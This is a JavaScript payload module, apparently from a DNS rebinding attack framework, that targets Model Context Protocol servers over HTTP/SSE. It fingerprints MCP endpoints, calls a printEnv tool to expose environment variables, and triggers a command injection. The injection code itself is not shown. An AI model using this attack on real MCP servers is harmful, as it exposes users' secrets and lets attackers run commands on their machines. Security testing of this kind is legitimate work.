/**
 * Model Context Protocol (MCP) over HTTP with Server-Sent Events (SSE) via DNS rebinding
 * Implements the MCP SSE transport as defined in:
 * https://modelcontextprotocol.io/specification/2024-11-05/basic/transports
 * 
 * SSE Transport Flow:
 * 1. Client connects to SSE endpoint to receive server messages
 * 2. Server sends 'endpoint' event with URI for client messages
 * 3. Client sends messages via HTTP POST to the endpoint URI
 * 4. Server sends responses via SSE 'message' events
 */

const McpSse = () => {
	// Invoked after DNS rebinding has been performed
	async function attack(_headers, _cookie, _body, _wsProxyPort) {
		const client = new McpSseClient("/sse");
		
		try {
			console.log('Starting MCP SSE attack...');
			
			// Connect to SSE endpoint
			await client.connect();

			// Initialize MCP session
			await client.initializeSession();

			// Try to list available functionality
			await client.listCapabilities();

			// Try to demonstrate impact with printEnv tool
			await client.demonstrateImpactPrintEnv();

			// Exploit command injection vulnerability
			await client.demonstrateCommandInjection();

		} catch (e) {
			console.log(`MCP SSE attack error: ${e}`);
		} finally {
			// Clean up SSE connection
			await client.close();
		}
	}

	// Invoked to determine whether the rebinded service is likely MCP SSE
	async function isService(_headers, _cookie, _body) {
		const client = new McpSseClient("/sse");
		return await client.isServiceDetected();
	}

	return { attack, isService };
}

// Registry value and manager-config.json value must match
Registry["MCP SSE"] = McpSse();

